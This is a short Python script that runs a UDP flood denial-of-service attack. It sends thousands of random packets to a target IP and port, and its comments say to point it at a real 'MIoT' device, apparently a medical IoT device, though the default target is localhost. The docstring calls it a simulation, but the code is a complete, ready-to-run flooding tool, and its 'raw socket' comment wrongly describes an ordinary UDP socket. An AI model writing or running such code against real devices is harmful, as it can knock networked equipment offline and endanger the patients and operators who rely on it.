import socket
import random
import time

def udp_flood(target_ip, target_port, packet_count=10000, packet_size=1024):
    """
    Simulates a UDP flood attack.
    
    Args:
        target_ip (str): Target device's IP address.
        target_port (int): Target port on the device.
        packet_count (int): Number of packets to send.
        packet_size (int): Size of each packet in bytes.
    """
    # Create a raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(packet_size)  # Random data for the packets
    
    print(f"Starting UDP flood attack on {target_ip}:{target_port}")
    start_time = time.time()
    
    try:
        for i in range(packet_count):
            sock.sendto(payload, (target_ip, target_port))
            if i % 1000 == 0:  # Print progress every 1000 packets
                print(f"Packets sent: {i}")
    except KeyboardInterrupt:
        print("Attack stopped manually.")
    finally:
        end_time = time.time()
        print(f"Attack completed. Sent {packet_count} packets in {end_time - start_time:.2f} seconds.")
        sock.close()

# Replace with the actual MIoT device IP and port
target_ip = "127.0.0.1"  # Example IP address of the MIoT device
target_port = 12345      # Example port for the device

udp_flood(target_ip, target_port)
